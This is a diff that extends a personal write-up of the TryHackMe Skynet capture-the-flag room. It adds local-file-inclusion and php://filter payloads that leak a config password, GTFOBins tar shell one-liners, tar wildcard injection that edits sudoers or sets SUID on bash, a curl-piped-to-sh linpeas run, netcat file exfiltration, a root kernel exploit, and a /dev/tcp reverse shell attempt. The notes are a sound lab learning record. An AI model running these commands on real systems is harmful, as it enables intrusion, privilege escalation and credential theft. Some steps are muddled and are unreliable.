@@ -362,7 +362,22 @@ So exploit is modifeid given what was present.
 http://THM_Target/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
 
-This successfully downloads the full passwd file, changing passwd to shadows blank page indicating not at root user access privilege.
+- This successfully downloads the full passwd file, changing passwd to shadows blank page indicating not at root user access privilege. Php will show a plain text file if permissions is allowed.
+- Permissions prevent shadow file which is expected.
+- thought i would try ?urlConfig=../../../../var/www/html/configuration.php, doesn’t show because PHP executes it instead of displaying it.
+
+To view the content of configuration.php it requires a PHP filter wrapper:
+```
+?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+```
+Then decode the base64 output.
+```
+...
+public $user = "root";
+public $password = "password123";
+...
+```
+   
 
 For remote file inclusion we can upload a reverse shell, using a PHP file. for a PHP file to be executable and to run a bash script inside:
 ```
@@ -524,12 +539,22 @@ but nothing really obvious to me stood out of list.
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/snapd/snap-confine
 /usr/lib/openssh/ssh-keysign
-www-data@skynet:/home/milesdyson/backups$
 ```
-From memory I think /usr/bin/at might have potential but I will focus on the TAR command.
-GTOBINS did not offer anything I could see would work here but knowing it reads any files in /var/www/html is likely the key this one was beyond me. But the idea was to use names starting with - aparently TAR interprets these as options the idea is TAR runs with root command and has ability to change the /etc/sudoers content. What is done is a create a simple script to run in the /var/www/html folder to add permissions to www-data to be able to use root access with no password. Then utilize touch to create 2 files to create files which start with - to be mishandled as options first then a file.
-```
+From memory I think /usr/bin/at used to be abusable years ago, but not on Ubuntu 16.04, and not in this CTF. Most here are normal for Ubuntu 16.04, no help here. I will focus on the TAR command.
 
+GTOBINS did offer:
+Two options for shell listed for TAR were from unprivileged user
+```
+tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+or
+tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"' 
+```
+- We know TAR is run from backup process every minute with milesdyson access permissions. But option 2 is out of reach as we need hist access to run it.
+
+- Looking at first option I could see would work here but knowing it reads any files in /var/www/html is likely the key this one was beyond me. But the idea was to use names starting with - aparently TAR interprets these as options the idea is TAR runs with root command and has ability to change the /etc/sudoers content. What is done is a create a simple script to run in the /var/www/html folder to add permissions to www-data to be able to use root access with no password. Then utilize touch to create 2 files to create files which start with - to be mishandled as options first then a file.
+
+This confused the hell out of me it only worked with - check... not double, --check.... While later attempts worked with --.
+```
 $ echo 'echo "www-data ALL=(root) NOPASSWD: ALL">>/etc/sudoers'>sudo.sh
 $ touch "/var/www/html/ - checkpoint-action=exec=sh sudo.sh"
 $ touch "/var/www/html/ - checkpoint=1"
@@ -548,3 +573,113 @@ $ sudo su
 $ cat /root/root.txt
 ```
 ANSWER Q5: 3f0372db24753accc7179a282cd6a949
+
+### linpeas I should have tried first, using a simple server in the and curl then saving output to file.
+
+earlier configuration file shows instantly:
+```
+/var/www/html/45kra24zxs28v3yd/administrator/Configuration.php:		
+public $password = "password123";
+```
+The linpeas from attack box on website was more limited than expected so I downloaded a better version from github. 
+
+### From public github linpeas did show more.
+```
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+Its also hard to view in online server, so drop |sh and use > output.txt and then use netcat to send the file back to the attack machine to view in nano or something.
+
+Several CVE were detected but due to limit in time one was selected and tried, there would be a similar process for others.
+```
+CVE‑2016‑5195            dirtycow                     Rank 4
+CVE‑2016‑5195            dirtycow 2                  Rank 4
+CVE‑2016‑8655            chocobo_root                Rank 1
+CVE‑2016‑9793            SO_{SND|RCV}BUFFORCE        Rank 1
+CVE‑2017‑7308            af_packet                   Rank 1
+CVE‑2017‑16995           eBPF_verifier               Rank 5
+CVE‑2017‑1000112         NETIF_F_UFO                 Rank 1
+CVE‑2017‑1000253         PIE_stack_corruption        Rank 1
+CVE‑2019‑15666           XFRM_UAF                    Rank 1
+CVE‑2021‑27365           linux‑iscsi                 Rank 1
+CVE‑2021‑3493            Ubuntu OverlayFS            Rank 1
+CVE‑2021‑22555           Netfilter heap OOB          Rank 1
+CVE‑2022‑32250           nft_object UAF              Rank 1
+CVE‑2017‑16695           get_rekt                    Rank 1
+CVE‑2017‑7308            packet_set_ring             Rank 1
+```
+
+Send: nc ip port < fileTosend.txt
+Receive nc -lnvp port > received.txt
+
+### CVE-2017-1000112 from exploit-db
+
+Instructions as usual in exploit but probably add this to be sure chmod +x pwn
+
+This definitely works:
+```
+ww-data@skynet:/var/www/html$ id 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@skynet:/var/www/html$ ./pwn
+bash: cannot set terminal process
+group (1329): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@skynet:/var/www/html# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### This was found from John Hammonds medium website.
+
+This was far more logical than other other options. This would set the SUID bit on /bin/bash if executed as root.
+
+The next two commands create files literally named:
+
+Was not sure why "" stored this way so i tried 
+```
+Basic format:
+echo " code here ">shell.sh
+echo "">"--checkpoint-action=exec=sh shell.sh
+echo ""> --checkpoint=1
+```
+Where in this case tar cf archive.tar, is done in the backup script.
+
+```
+printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" >--checkpoint=1
+
+www-data@skynet:/var/www/html$ printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
+<ml$ printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh                     
+www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+<ml$ echo "" > "--checkpoint-action=exec=sh shell.sh"                        
+www-data@skynet:/var/www/html$ echo "" >--checkpoint=1
+echo "" >--checkpoint=1
+www-data@skynet:/var/www/html$ ls -la /bin/bash
+
+Before:
+www-data@skynet:/var/www/html$ ls -la /bin/bash
+ls -la //bin/bash
+-rwxr-xr-x 1 root root 1037528 Jul 12  2019 //bin/bash
+
+After:
+ls -la /bin/bash
+-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
+```
+
+I not could get this method to work:
+
+```
+echo "bash -i >& /dev/tcp/THM_Target/4445 0>&1" > revshell.sh
+echo " " > "--checkpoint=1"
+echo " " > "--checkpoint-action=exec=bash revshell.sh"
+
+with netcat listening on port 4445
+```
+It might have worked with the following but was not tried due to time restraints:
+```
+printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
+chmod +x shell.sh
+echo " " > "--checkpoint=1"
+echo " " > "--checkpoint-action=exec=bash revshell.sh"
+```
